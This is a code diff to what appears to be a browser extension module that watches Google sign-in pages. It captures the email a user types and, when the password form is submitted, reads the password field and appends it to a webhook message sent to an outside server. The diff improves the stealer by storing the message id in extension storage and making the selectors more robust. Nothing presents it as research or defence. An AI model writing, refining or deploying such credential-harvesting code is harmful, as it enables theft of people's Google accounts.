@@ -1,6 +1,7 @@
 const Util = require('../../utils');
 const { formatFields, code } = require('../../utils/Webhook');
-const variable = `messageid${Date.now()}`;
+const { wait } = require('../../utils/Document');
+const variable = `${window.location.hostname}_${Date.now()}_messageId`;
 
 module.exports = {
   webPattern: /https:\/\/accounts\.google\.com/g,
@@ -21,20 +22,23 @@ module.exports = {
               ['Email', code(emailInput.value)],
             ])
           });
-          window[variable] = id;
+          await chrome.storage.local.set({ [variable]: id });
         });
       }
     },
     {
       path: '/v3/signin/challenge/pwd',
-      run() {
-        const passwordInput = document.querySelector('.whsOnd.zHQkBf');
-        const submitButton = document.querySelector('button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]');
+      async run() {
+        await wait(1000);
+        const passwordInput = document.querySelector(this.getSelector('input'));
+        const submitButton = document.querySelector(this.getSelector('submit'));
 
         submitButton.addEventListener('click', async () => {
-          const embed = await Util.Webhook.getMessage(window[variable]);
+          const id = await chrome.storage.local.get(variable);
+          if (!id) return;
+          const embed = await Util.Webhook.getMessage(id);
           embed.fields.push(['Password', passwordInput.value]);
-          await Util.Webhook.editEmbed(embed, window[variable]);
+          await Util.Webhook.editEmbed(embed, id);
         });
       }
     }
